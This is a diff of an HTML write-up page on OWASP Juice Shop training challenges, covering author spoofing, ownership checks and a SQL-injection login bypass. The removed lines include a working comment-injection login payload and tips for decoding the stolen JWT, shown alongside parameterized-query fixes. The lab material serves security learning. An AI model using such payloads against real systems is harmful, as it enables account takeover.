-                        <div class="exploit-label fix-bg mb-2">Fix</div>
-                        <pre><span style="color:#6b7280">// ❌ Vulnerable — trusts client-provided author</span>
-db.reviews.insert({ message: req.body.message, author: req.body.author })
-
-<span style="color:#6b7280">// ✅ Ignore author from body — extract from verified JWT</span>
-const author = req.user.email  <span style="color:#6b7280">// decoded from JWT server-side</span>
-db.reviews.insert({ message: req.body.message, author })</pre>
-                    </div>
-
-                    <div class="bg-slate-800/40 rounded-xl p-4 text-sm text-slate-400">
-                        <strong class="text-white">Rule:</strong> The client should never be trusted to declare who they are. Identity must always come from the server-verified JWT or session token — never from the request body.
-                    </div>
+                    <div class="exploit-label fix-bg mb-2">Solution</div>
+                    <pre>// Safe — read from verified JWT server side
+const author = req.user.email 
+db.reviews.insert({ message: req.body.message, author: author })</pre>
                 </div>
             </div>
         </div>
 
-        <!-- ===== 7. Admin Delete Any Review ===== -->
         <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="access">
             <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
                 <div class="flex items-start gap-4">
                     <div class="dot bg-purple-400 mt-1"></div>
                     <div>
                         <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="sev-medium text-xs font-bold px-2 py-0.5 rounded mono">MEDIUM</span>
                             <span class="tag tag-access">Access Control</span>
                         </div>
-                        <h2 class="text-xl font-bold text-white">Admin Can Delete Any User's Review</h2>
-                        <p class="text-slate-500 text-sm mt-1">Role check without ownership check</p>
+                        <h2 class="text-xl font-bold text-white">Insecure Resource Ownership</h2>
+                        <p class="text-slate-500 text-sm mt-1">Lack of validation for resource deletion</p>
                     </div>
                 </div>
                 <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
             </div>
             <div class="accordion-content">
                 <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">The admin panel allows deleting any review. The endpoint checks that the user is an admin, but never verifies that the admin owns the review. Delete authorization should be restricted to the original author only — admin role should not override ownership for user-generated content.</p>
-
-                    <div>
-                        <div class="exploit-label fix-bg mb-2">Fix</div>
-                        <pre><span style="color:#6b7280">// ❌ Only checks role — not ownership</span>
-if (req.user.role === 'admin') {
-  db.reviews.delete({ _id: req.params.id })
-}
-
-<span style="color:#6b7280">// ✅ Check ownership regardless of role</span>
-const review = await db.reviews.findOne({ _id: req.params.id })
-
-if (!review) return res.status(404).json({ error: 'Not found' })
-
+                    <p class="text-slate-400 leading-relaxed">While the site uses roles (Admin), it fails to check resource ownership. This allows a user to delete or edit data they do not own.</p>
+                    
+                    <div class="exploit-label fix-bg mb-2">Solution — Ownership Verification</div>
+                    <pre>const review = db.reviews.findOne({ _id: req.params.id })
 if (review.author !== req.user.email) {
-  return res.status(403).json({ error: 'Forbidden — not your review' })
-}
-
-await db.reviews.delete({ _id: req.params.id })</pre>
-                    </div>
-
-                    <div class="bg-slate-800/40 rounded-xl p-4 text-sm text-slate-400">
-                        <strong class="text-white">Role vs Ownership:</strong> Roles describe what type of user someone is. Ownership describes whether a specific resource belongs to them. Both checks must exist independently — a role of "admin" does not automatically confer ownership over another user's data.
-                    </div>
+  return res.status(403).json({ error: 'Access Denied' })
+}</pre>
                 </div>
             </div>
         </div>
 
-        <!-- ===== 8. SQLi Login Bypass for Arbitrary User ===== -->
-        <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="sqli injection access">
+        <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="access injection">
             <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
                 <div class="flex items-start gap-4">
-                    <div class="dot bg-green-400 mt-1"></div>
+                    <div class="dot bg-purple-400 mt-1"></div>
                     <div>
                         <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="sev-critical text-xs font-bold px-2 py-0.5 rounded mono">CRITICAL</span>
-                            <span class="tag tag-sqli">SQLi</span>
                             <span class="tag tag-access">Access Control</span>
+                            <span class="tag tag-injection">Injection</span>
                         </div>
-                        <h2 class="text-xl font-bold text-white">Login as Any User via SQL Comment Injection</h2>
-                        <p class="text-slate-500 text-sm mt-1">Obtain JWT for any account — enables credential reset</p>
+                        <h2 class="text-xl font-bold text-white">JWT Exfiltration via Injection</h2>
+                        <p class="text-slate-500 text-sm mt-1">Truncating SQL checks to harvest session tokens</p>
                     </div>
                 </div>
                 <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
             </div>
             <div class="accordion-content">
                 <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">By entering a known username followed by <code>'--</code>, the password check condition in the SQL query is commented out. The server returns a valid JWT for the targeted account, which can be decoded to retrieve credentials and used to take over the account or trigger a password reset.</p>
-
-                    <div>
-                        <div class="exploit-label exploit-bg mb-2">Exploit</div>
-                        <pre>{
-  "email": "jim@juice-sh.op'--",
-  "password": "anything"
-}
-
-<span style="color:#6b7280">// Resulting SQL:</span>
-SELECT * FROM Users WHERE email = 'jim@juice-sh.op'
-<span style="color:#f87171">--' AND password = '...' AND deletedAt IS NULL</span>
-<span style="color:#6b7280">// Everything after -- is ignored → login succeeds</span></pre>
-                        <p class="text-slate-500 text-sm mt-2">The response contains a full JWT. Decode it at jwt.io to extract the user's email, hashed password, and role.</p>
-                    </div>
-
-                    <div>
-                        <div class="exploit-label fix-bg mb-2">Fix</div>
-                        <pre><span style="color:#6b7280">// ❌ Vulnerable</span>
-db.query(`SELECT * FROM Users WHERE email = '${email}' AND password = '${hash}'`)
-
-<span style="color:#6b7280">// ✅ Parameterized query — makes '-- a literal string</span>
-db.query(
-  'SELECT * FROM Users WHERE email = ? AND password = ? AND deletedAt IS NULL',
-  [email, hash]
-)</pre>
-                    </div>
+                    <p class="text-slate-400 leading-relaxed">By interpolating user input directly into a reset query, the password check can be bypassed using <code>'--</code>. This returns a valid JWT to the attacker, allowing full account takeover.</p>
+                    
+                    <div class="exploit-label fix-bg mb-2">Solution</div>
+                    <p class="text-slate-400 text-sm">Eliminate string interpolation across all authentication and account management endpoints. Trusting any client-supplied identity claim without server-side verification is the root cause across these final 4 vulnerabilities.</p>
                 </div>
-            </div>
-        </div>
-
-        <!-- Summary table -->
-        <div class="glass-card rounded-2xl p-6 mt-8">
-            <h2 class="text-lg font-bold text-white mb-5 flex items-center gap-2">
-                <i class="fas fa-table text-blue-400"></i> Summary
-            </h2>
-            <div class="overflow-x-auto">
-                <table class="w-full text-sm">
-                    <thead>
-                        <tr class="text-xs mono text-slate-500 border-b border-slate-800">
-                            <th class="text-left py-2 pr-4">Vulnerability</th>
-                            <th class="text-left py-2 pr-4">Severity</th>
-                            <th class="text-left py-2">Root Cause</th>
-                        </tr>
-                    </thead>
-                    <tbody class="text-slate-400">
-                        <tr class="border-b border-slate-800/50"><td class="py-2.5 pr-4 text-white">Admin SQL Injection</td><td class="pr-4"><span class="sev-critical text-xs px-2 py-0.5 rounded mono">CRITICAL</span></td><td>String interpolation in SQL query</td></tr>
-                        <tr class="border-b border-slate-800/50"><td class="py-2.5 pr-4 text-white">DOM XSS</td><td class="pr-4"><span class="sev-high text-xs px-2 py-0.5 rounded mono">HIGH</span></td><td>innerHTML sink + unsanitized location.hash</td></tr>
-                        <tr class="border-b border-slate-800/50"><td class="py-2.5 pr-4 text-white">Reflected XSS</td><td class="pr-4"><span class="sev-high text-xs px-2 py-0.5 rounded mono">HIGH</span></td><td>Server reflects unencoded query param</td></tr>
-                        <tr class="border-b border-slate-800/50"><td class="py-2.5 pr-4 text-white">Stored XSS</td><td class="pr-4"><span class="sev-critical text-xs px-2 py-0.5 rounded mono">CRITICAL</span></td><td>Raw HTML stored in DB, rendered via innerHTML</td></tr>
-                        <tr class="border-b border-slate-800/50"><td class="py-2.5 pr-4 text-white">NoSQL Injection</td><td class="pr-4"><span class="sev-high text-xs px-2 py-0.5 rounded mono">HIGH</span></td><td>MongoDB operator passed as user input</td></tr>
-                        <tr class="border-b border-slate-800/50"><td class="py-2.5 pr-4 text-white">Author Spoofing</td><td class="pr-4"><span class="sev-medium text-xs px-2 py-0.5 rounded mono">MEDIUM</span></td><td>Identity taken from request body</td></tr>
-                        <tr class="border-b border-slate-800/50"><td class="py-2.5 pr-4 text-white">Admin Delete Bypass</td><td class="pr-4"><span class="sev-medium text-xs px-2 py-0.5 rounded mono">MEDIUM</span></td><td>Role checked, ownership not checked</td></tr>
-                        <tr><td class="py-2.5 pr-4 text-white">User Impersonation SQLi</td><td class="pr-4"><span class="sev-critical text-xs px-2 py-0.5 rounded mono">CRITICAL</span></td><td>SQL comment terminates password check</td></tr>
-                    </tbody>
-                </table>
             </div>
         </div>
 
     </main>
 
-    <footer class="py-12 text-center text-slate-500 border-t border-slate-800/50 mt-12">
-        <p class="text-sm">Part of my OWASP Juice Shop security research</p>
-        <p class="mt-2 font-mono text-xs uppercase tracking-widest">Harshith Suresh © 2026</p>
-    </footer>
-
     <script>
-        function toggleAccordion(header) {
-            const card = header.closest('.challenge-card');
-            const content = card.querySelector('.accordion-content');
-            const chevron = header.querySelector('.chevron');
-            const isOpen = content.classList.contains('open');
-
-            // Close all
-            document.querySelectorAll('.accordion-content.open').forEach(c => c.classList.remove('open'));
-            document.querySelectorAll('.chevron.open').forEach(c => c.classList.remove('open'));
-
-            if (!isOpen) {
-                content.classList.add('open');
-                chevron.classList.add('open');
-            }
+        function toggleAccordion(element) {
+            const content = element.nextElementSibling;
+            const chevron = element.querySelector('.chevron');
+            content.classList.toggle('open');
+            chevron.classList.toggle('open');
         }
 
         function filterCards(tag, btn) {
-            // Update active button
-            document.querySelectorAll('.tag[onclick]').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tag').forEach(t => t.classList.remove('active'));
             btn.classList.add('active');
-
+            
             const cards = document.querySelectorAll('.challenge-card');
             cards.forEach(card => {
-                if (tag === 'all') {
+                if (tag === 'all' || card.getAttribute('data-tags').includes(tag)) {
                     card.classList.remove('hidden');
-                    card.classList.add('fade-in');
                 } else {
-                    const tags = card.dataset.tags || '';
-                    if (tags.includes(tag)) {
-                        card.classList.remove('hidden');
-                        card.classList.add('fade-in');
-                    } else {
-                        card.classList.add('hidden');
-                        card.classList.remove('fade-in');
-                    }
+                    card.classList.add('hidden');
                 }
             });
         }
-
-        // Open first card by default
-        document.addEventListener('DOMContentLoaded', () => {
-            const first = document.querySelector('.challenge-card .p-6');
-            if (first) toggleAccordion(first);
-        });
     </script>
 </body>
 </html>
